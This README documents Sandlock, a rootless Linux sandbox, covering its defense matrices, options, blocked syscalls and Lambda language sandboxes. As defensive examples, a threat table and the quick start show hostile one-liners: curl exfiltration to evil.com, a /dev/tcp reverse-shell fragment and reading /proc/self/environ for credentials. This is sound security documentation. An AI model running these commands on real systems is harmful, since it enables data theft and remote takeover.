# Sandlock 🔒

Lightweight userspace sandbox for Linux. No root required.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![CI](https://github.com/bkmashiro/Sandlock/actions/workflows/ci.yml/badge.svg)](https://github.com/bkmashiro/Sandlock/actions/workflows/ci.yml)
[![Security Tests](https://github.com/bkmashiro/Sandlock/actions/workflows/security-tests.yml/badge.svg)](https://github.com/bkmashiro/Sandlock/actions/workflows/security-tests.yml)

**[中文文档](README_zh.md)** | **[日本語ドキュメント](README_ja.md)**

## Features

- 🔒 **seccomp-bpf** syscall filtering (60+ dangerous syscalls blocked)
- 📊 **Resource limits** - CPU, memory, file size, open files
- 🌐 **Network isolation** - Block all socket operations
- 🧵 **Thread-safe** - Blocks fork while allowing threads
- 🏔️ **Landlock** - Filesystem sandboxing (kernel 5.13+)
- 🎯 **Strict mode** - Path-level syscall interception (kernel 5.0+)
- ⚡ **Low overhead** - ~1.5ms startup cost
- 🔧 **Configurable** - Enable/disable each security feature
- 🚫 **No root required** - Pure userspace implementation

## Attack Defense Matrix

### Defense Status by Environment

| Attack | Userspace | Lambda+Py | Lambda+Node | Lambda+Preload | Lambda Only |
|--------|:---------:|:---------:|:-----------:|:--------------:|:-----------:|
| Network exfiltration | ✅ | ✅ | ✅ | ✅ | ❌ |
| Reverse shell | ✅ | ✅ | ✅ | ✅ | ❌ |
| Fork bomb | ✅ | ✅ | ✅ | ✅ | ⚠️ |
| subprocess/exec | ✅ | ✅ | ✅ | ✅ | ❌ |
| Memory exhaustion | ✅ | ✅ | ✅ | ✅ | ✅ |
| CPU exhaustion | ✅ | ✅ | ✅ | ✅ | ✅ |
| Disk filling | ✅ | ✅ | ✅ | ✅ | ✅ |
| Infinite loop | ✅ | ✅ | ✅ | ✅ | ✅ |
| Read sensitive files | ✅ | ✅ | ✅ | ✅ | ❌ |
| Write outside /tmp | ✅ | ✅ | ✅ | ✅ | ✅ |
| ptrace/debugging | ✅ | ✅ | ✅ | ✅ | ✅ |
| Symlink attacks | ✅ | ✅ | ✅ | ⚠️ | ❌ |
| dlopen/FFI bypass | ✅ | ✅ | ✅ | ⚠️ | ❌ |
| eval/exec (dynamic) | N/A | ✅ | ✅ | N/A | ❌ |
| Direct syscall (asm) | ✅ | ⚠️ | ⚠️ | ⚠️ | ❌ |
| Sandbox escape | ✅ | ⚠️ | ⚠️ | N/A | N/A |
| /proc info leak | ⚠️ | ⚠️ | ⚠️ | ⚠️ | ❌ |
| VPC lateral movement | N/A | ❌ | ❌ | ❌ | ❌ |
| IAM credential theft | N/A | ❌ | ❌ | ❌ | ❌ |

Legend: ✅ Defended | ⚠️ Partial | ❌ Not defended | N/A Not applicable

**Lambda+Preload** = LD_PRELOAD + source scanner + dynamic linking (for C/C++/Rust/Go)

### Defense Technologies

| Attack | Userspace | Lambda+Py/Node | Lambda+Preload | Lambda Only |
|--------|-----------|----------------|----------------|-------------|
| Network | seccomp | import/module block | LD_PRELOAD | ❌ use VPC |
| Fork | seccomp | import/module block | LD_PRELOAD | Lambda limit |
| Memory | rlimit | rlimit | rlimit | Lambda config |
| CPU/timeout | rlimit | rlimit | rlimit | Lambda timeout |
| Disk | rlimit | rlimit | rlimit | /tmp 512MB |
| File read | Landlock/strict | restricted open() | LD_PRELOAD | ❌ |
| File write | Landlock/strict | restricted open() | LD_PRELOAD | read-only rootfs |
| ptrace | seccomp | no ctypes/ffi | Firecracker | Firecracker |
| Symlink | seccomp | no os module | ⚠️ partial | ❌ |
| FFI/dlopen | seccomp | blocked imports | source scanner | ❌ |
| Direct syscall | seccomp | ⚠️ scanner | ⚠️ scanner | ❌ |
| Sandbox escape | seccomp | ⚠️ partial | N/A | N/A |

### Lambda Built-in Protections

Lambda provides some protections even without Sandlock:

| Protection | Description |
|------------|-------------|
| ✅ Read-only rootfs | Cannot write to /var/task, /opt |
| ✅ Firecracker seccomp | Blocks ptrace, mount, reboot, etc. |
| ✅ Memory limit | Configured per function (128MB-10GB) |
| ✅ Timeout | Configured per function (max 15min) |
| ✅ /tmp limit | 512MB ephemeral storage |
| ✅ Concurrency limit | Limits parallel executions |
| ❌ Network | Full outbound access by default |
| ❌ File read | Can read /etc/passwd, /proc, etc. |
| ❌ Subprocess | Can spawn processes |

### Known Bypass Risks

| Risk | Applies To | Description | Mitigation |
|------|------------|-------------|------------|
| Direct syscall | Lambda+Py/Node | Inline asm in C extensions | Source scanner, no custom C |
| `__subclasses__` | Lambda+Py | Python sandbox escape | Restricted builtins (partial) |
| /proc readable | All | `/proc/self/environ`, `/proc/self/maps` | `--clean-env` (partial) |
| VPC lateral | Lambda | Scan/attack internal hosts | VPC isolation (no NAT) |
| IAM credentials | Lambda | AWS_* env vars | Minimal IAM role |
| Native addons | Lambda+Node | .node files bypass | Module whitelist |

### Full-Stack Comparison: Lambda vs Userspace

**Full-Stack Userspace:**
```
seccomp-bpf + Landlock + rlimits + language sandbox + source scanner + clean-env
```

**Full-Stack Lambda:**
```
VPC isolation + rlimits + language sandbox + LD_PRELOAD + source scanner + clean-env
```

| Attack | Full-Stack Userspace | Full-Stack Lambda | Bypass Difficulty |
|--------|:--------------------:|:-----------------:|:-----------------:|
| Network exfiltration | ✅ seccomp+lang | ✅ VPC+lang+preload | 🔴 Impossible |
| Reverse shell | ✅ seccomp+lang | ✅ VPC+lang+preload | 🔴 Impossible |
| Fork/subprocess | ✅ seccomp+lang | ✅ lang+preload | 🔴 Very Hard |
| Memory/CPU/Disk | ✅ rlimit | ✅ rlimit+Lambda | 🔴 Impossible |
| Read sensitive files | ✅ Landlock+lang | ✅ lang+preload | 🔴 Very Hard |
| Write outside /tmp | ✅ Landlock | ✅ Lambda rootfs | 🔴 Impossible |
| ptrace/debugging | ✅ seccomp | ✅ Firecracker | 🔴 Impossible |
| Direct syscall (asm) | ✅ seccomp | ⚠️ scanner only | 🟡 Hard |
| dlopen/FFI | ✅ seccomp+lang | ✅ lang+scanner | 🔴 Very Hard |
| Sandbox escape | ✅ seccomp | ⚠️ lang+scanner | 🟡 Hard |
| /proc info leak | ⚠️ partial | ⚠️ partial | 🟢 Medium |
| VPC lateral | N/A | ✅ VPC isolation | 🔴 Impossible |
| Kernel 0-day | ⚠️ | ⚠️ | 🔴 Requires 0-day |

**Security Level Summary:**

| Configuration | Security | Use Case |
|---------------|:--------:|----------|
| Full-Stack Userspace | 🟢🟢🟢 | Maximum security, any untrusted code |
| Full-Stack Lambda | 🟢🟢 | Production student code execution |
| Lambda + Language only | 🟡 | Basic protection |
| Lambda only | 🟠 | Not recommended for untrusted code |

**Remaining Attack Surface (Full-Stack):**

| Environment | Remaining Risks |
|-------------|-----------------|
| Userspace | Kernel 0-day, timing side-channels |
| Lambda | Inline asm bypass, kernel 0-day, sandbox escape tricks |

## Quick Start

```bash
# Build
make

# Block network
./sandlock --no-network -- curl https://evil.com
# Error: Operation not permitted

# Limit resources
./sandlock --cpu 5 --mem 64 -- python3 heavy_script.py

# Full sandbox
./sandlock --no-network --no-fork --clean-env --cpu 5 --mem 256 -- ./untrusted
```

## Installation

```bash
# Build from source (requires libseccomp-dev)
sudo apt install libseccomp-dev  # Debian/Ubuntu
make
sudo make install

# Or just copy the binary
cp sandlock /usr/local/bin/
```

## Usage

```
sandlock [OPTIONS] -- COMMAND [ARGS...]

Resource Limits:
  --cpu SEC          CPU time limit in seconds
  --mem MB           Memory limit in megabytes
  --fsize MB         Max file size in megabytes
  --nofile N         Max open file descriptors
  --nproc N          Max processes (per-user)
  --timeout SEC      Wall-clock timeout

Security Features:
  --no-network       Block all network syscalls
  --no-fork          Block fork/clone (allow threads)
  --no-dangerous     Block dangerous syscalls (default: on)
  --allow-dangerous  Disable dangerous syscall blocking
  --clean-env        Sanitize environment variables

Landlock (kernel 5.13+):
  --landlock         Enable Landlock filesystem sandbox
  --ro PATH          Add read-only path (repeatable)
  --rw PATH          Add read-write path (repeatable)

Strict Mode (kernel 5.0+):
  --strict           Enable path-level syscall interception
  --allow PATH       Allow access to path (repeatable, required with --strict)

I/O Control:
  --pipe-io          Wrap I/O in pipes
  --max-output N     Limit output size in bytes

Isolation:
  --isolate-tmp      Use private /tmp directory
  --workdir DIR      Set working directory

Logging:
  -v, --verbose      Increase verbosity (can repeat: -vv)
  -q, --quiet        Decrease verbosity (-q, -qq, -qqq)

Other:
  --features         Show available features
  -h, --help         Show help
  --version          Show version
```

## Examples

### Run untrusted code

```bash
# Student code submission
sandlock --no-network --no-fork --clean-env \
         --cpu 5 --mem 256 --timeout 30 \
         -- python3 student_code.py
```

### Filesystem sandbox (Landlock)

```bash
# Only allow /tmp (rw) and /usr (ro)
sandlock --landlock --rw /tmp --ro /usr --ro /lib --ro /lib64 \
         -- python3 -c "open('/etc/passwd')"  # Blocked!
```

### Strict mode (path-level control)

```bash
# Only allow access to /tmp, block everything else
sandlock --strict --allow /tmp -v -- sh -c "echo test > /tmp/ok.txt"
# DEBUG: ALLOWED: openat(/tmp/ok.txt)

sandlock --strict --allow /tmp -v -- cat /etc/passwd
# DEBUG: BLOCKED: openat(/etc/passwd)
# cat: /etc/passwd: Permission denied
```

> ⚠️ **Strict mode conflicts:**
> - Cannot use with `--pipe-io` (deadlock risk)
> - Requires at least one `--allow PATH`
> - Redundant with `--landlock` (strict provides stronger isolation)

### Output limiting

```bash
# Limit output to 1MB
sandlock --pipe-io --max-output 1048576 -- ./verbose_program
```

## Blocked Syscalls (with --no-dangerous)

| Category | Syscalls |
|----------|----------|
| Debug | ptrace, process_vm_readv, process_vm_writev |
| Kernel | bpf, io_uring_*, userfaultfd, perf_event_open |
| Namespace | unshare, setns |
| Filesystem | mount, umount2, chroot, pivot_root, symlink, link |
| System | reboot, kexec_*, init_module, *_module |
| Monitoring | inotify_*, fanotify_* |
| Keys | keyctl, add_key, request_key |
| Hardware | ioperm, iopl, modify_ldt |
| Time | settimeofday, clock_settime, adjtimex |
| Misc | personality, quotactl, nfsservctl |

## Security Model

```
┌────────────────────────────────────────┐
│         Untrusted Process              │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │    Strict Mode (kernel 5.0+)     │  │
│  │  (seccomp notify path control)   │  │
│  │  • Intercepts openat/execve      │  │
│  │  • Validates against allowlist   │  │
│  └──────────────────────────────────┘  │
│                or                      │
│  ┌──────────────────────────────────┐  │
│  │       Landlock (kernel 5.13+)    │  │
│  │   (filesystem access control)    │  │
│  └──────────────────────────────────┘  │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │         seccomp-bpf              │  │
│  │   (syscall filtering layer)      │  │
│  │  • 60+ syscalls blocked          │  │
│  │  • Network optionally blocked    │  │
│  │  • Fork optionally blocked       │  │
│  └──────────────────────────────────┘  │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │           rlimits                │  │
│  │   (resource limiting layer)      │  │
│  │  • CPU, Memory, Files            │  │
│  └──────────────────────────────────┘  │
│                                        │
│  ┌──────────────────────────────────┐  │
│  │      prctl(NO_NEW_PRIVS)         │  │
│  │   (privilege escalation block)   │  │
│  └──────────────────────────────────┘  │
└────────────────────────────────────────┘
```

## Comparison

| Feature | sandlock | Docker | Firejail | bubblewrap |
|---------|:--------:|:------:|:--------:|:----------:|
| Root required | ❌ | ✅ | ⚠️ | ⚠️ |
| Overhead | ~1.5ms | ~100ms | ~50ms | ~10ms |
| Network isolation | ✅ | ✅ | ✅ | ✅ |
| Filesystem sandbox | ✅* | ✅ | ✅ | ✅ |
| Resource limits | ✅ | ✅ | ✅ | ❌ |
| Syscall filtering | ✅ | ✅ | ✅ | ✅ |
| Complexity | Low | High | Medium | Medium |

*Landlock requires kernel 5.13+

## Option Conflicts

Sandlock validates configuration at startup and warns about conflicts:

| Options | Conflict | Resolution |
|---------|----------|------------|
| `--strict` + `--pipe-io` | Deadlock risk | `--pipe-io` disabled |
| `--strict` without `--allow` | No paths allowed | Error, won't start |
| `--landlock` + `--strict` | Redundant | Warning (strict stronger) |
| `--isolate-tmp` + `--cleanup-tmp` | Redundant | Warning (isolate auto-cleans) |
| `--cpu N` > `--timeout M` | Timeout first | Warning |

## Known Limitations

- `/proc` is readable (Linux limitation without mount namespace)
- `RLIMIT_NPROC` is per-user, not per-sandbox
- Requires `libseccomp` on the system
- Linux only (uses seccomp-bpf)
- Landlock requires kernel 5.13+ (graceful fallback on older kernels)

## AWS Lambda

> ⚠️ **Sandlock kernel features (seccomp, Landlock) do NOT work on Lambda.**

Lambda's Firecracker microVM pre-applies seccomp filters, blocking additional filter installation.

### What Works on Lambda

| Feature | Status | Notes |
|---------|:------:|-------|
| rlimits (CPU/mem/fsize) | ✅ | Resource limits work |
| `--timeout` | ✅ | SIGALRM works |
| `--clean-env` | ✅ | Environment sanitization |
| `--isolate-tmp` | ✅ | /tmp isolation |
| `lang/python/sandbox.py` | ✅ | Python-level restrictions |

### What Does NOT Work

| Feature | Status | Reason |
|---------|:------:|--------|
| seccomp-bpf | ❌ | Firecracker blocks filter installation |
| `--no-network` | ❌ | Requires seccomp |
| `--no-fork` | ❌ | Requires seccomp |
| `--strict` | ❌ | Requires seccomp notify |
| Landlock | ❌ | Kernel 5.10 < 5.13 |

### Recommended Lambda Setup

**Use VPC isolation for network security:**

```
┌─────────────────────────────────────┐
│ VPC (Private Subnet, No NAT)        │
│                                     │
│   Lambda ──✗──► Internet            │
│      │                              │
│      └──► VPC Endpoint (optional)   │
│           └──► Specific AWS services│
└─────────────────────────────────────┘
```

```yaml
# serverless.yml example
functions:
  sandbox:
    timeout: 30
    memorySize: 256
    vpc:
      subnetIds:
        - subnet-private-no-nat
      securityGroupIds:
        - sg-no-outbound
```

### What AWS Features Do NOT Help

| AWS Feature | Why It Doesn't Help |
|-------------|---------------------|
| Code Signing | Deployment-time only, not runtime |
| IAM Roles | Controls AWS API access, not syscalls |
| CloudWatch | Monitoring only, no prevention |
| X-Ray | Tracing only |
| Security Hub | Compliance scanning, not runtime |

### Lambda Security Summary

```
For network isolation: VPC (no NAT gateway)
For resource limits: rlimits (works)
For Python code: lang/python/sandbox.py
For JavaScript: lang/javascript/wrapper.js
For compiled langs: LD_PRELOAD + source scanning
```

## Language Sandboxes

For Lambda and other environments where kernel-level sandboxing is unavailable.

### Python Sandbox

```bash
python lang/python/sandbox.py user_code.py --timeout 5 --memory 128
```

**Blocks:** `socket`, `subprocess`, `os`, `ctypes`, `mmap`, `pickle`
**Allows:** `math`, `json`, `re`, `collections`, `datetime`

### JavaScript Sandbox

Two options:

```bash
# VM isolation (stronger, limited API)
node lang/javascript/sandbox.js user_code.js --timeout 5000

# Runtime wrapper (full Node API, module blocking)
node lang/javascript/wrapper.js user_code.js
```

| Feature | sandbox.js (vm) | wrapper.js |
|---------|:---------------:|:----------:|
| npm packages | ❌ | ✅ |
| Full Node API | ❌ | ✅ |
| Isolation strength | Higher | Medium |

### Source Code Scanner

Pre-compilation check for dangerous patterns:

```bash
python lang/scanner/scanner.py code.c --json
```

**Detects:**
- 🔴 Critical: `asm()`, `syscall`, `int 0x80`, `_start()`
- 🟠 High: `ctypes`, `dlopen`, `ffi`, `SYS_*`
- 🟡 Medium: `fork`, `socket`, `eval`

**Supports:** C/C++, Python, JavaScript, Rust, Go

### LD_PRELOAD Hook

For compiled languages when we control compilation:

```bash
# Build
cd lang/preload && make

# Use
LD_PRELOAD=./sandbox_preload.so \
  SANDBOX_NO_NETWORK=1 \
  SANDBOX_NO_FORK=1 \
  ./user_program
```

⚠️ **Can be bypassed** by inline assembly. Use with source scanning.

### Attack Defense Matrix by Environment

| Attack | Userspace | Lambda+Python | Lambda+Other |
|--------|:---------:|:-------------:|:------------:|
| **Network** ||||
| TCP/UDP exfiltration | ✅ seccomp | ⚠️ import hook | ❌ VPC only |
| Reverse shell | ✅ seccomp | ⚠️ import hook | ❌ VPC only |
| **Process** ||||
| Fork bomb | ✅ seccomp | ✅ import hook | ❌ **Undefended** |
| subprocess/exec | ✅ seccomp | ✅ import hook | ❌ **Undefended** |
| **Filesystem** ||||
| Read /etc/passwd | ✅ Landlock | ✅ restricted open | ❌ **Undefended** |
| Write anywhere | ✅ Landlock | ✅ restricted open | ❌ **Undefended** |
| **Low-level** ||||
| ptrace | ✅ seccomp | ✅ no ctypes | ❌ **Undefended** |
| Direct syscall | ✅ seccomp | ✅ no ctypes | ❌ **Undefended** |
| io_uring | ✅ seccomp | ✅ blocked | ❌ **Undefended** |
| **Resources** ||||
| CPU exhaustion | ✅ rlimit | ✅ rlimit | ✅ rlimit |
| Memory exhaustion | ✅ rlimit | ✅ rlimit | ✅ rlimit |
| Timeout | ✅ SIGALRM | ✅ SIGALRM | ✅ SIGALRM |

### ⚠️ Lambda Non-Python: Undefended Attacks

| Attack | Example | Impact | Mitigation |
|--------|---------|--------|------------|
| Data exfiltration | `curl evil.com?d=secret` | Data leak | VPC isolation |
| Reverse shell | `bash -i >& /dev/tcp/...` | Full control | VPC isolation |
| Credential theft | `cat /proc/self/environ` | AWS keys | Minimal IAM |
| Crypto mining | Download & run miner | Resource abuse | VPC + timeout |
| Lateral movement | Scan internal VPC | Attack other services | Security groups |

### Risk Assessment

| Environment | Security | Recommendation |
|-------------|:--------:|----------------|
| Userspace + Sandlock | 🟢 High | Run any untrusted code |
| Lambda + Python sandbox | 🟡 Medium | Acceptable for student code |
| Lambda + JS wrapper | 🟡 Medium | Acceptable for student code |
| Lambda + LD_PRELOAD + scanner | 🟡 Medium | Compiled code with source check |
| Lambda + VPC only | 🟠 Low | Only semi-trusted code |
| Lambda without protection | 🔴 Critical | Never run untrusted code |

## Testing

```bash
# Run test suite (requires Docker)
make test

# Or run directly on Linux
./test.sh

# Check available features
./sandlock --features
```

## License

MIT License - see [LICENSE](LICENSE)

## Contributing

Contributions welcome! Please open an issue or PR.

## Related Projects

- [minijail](https://google.github.io/minijail/) - Google's sandboxing library
- [firejail](https://github.com/netblue30/firejail) - SUID sandbox
- [bubblewrap](https://github.com/containers/bubblewrap) - Unprivileged sandboxing
- [nsjail](https://github.com/google/nsjail) - Process isolation with namespaces
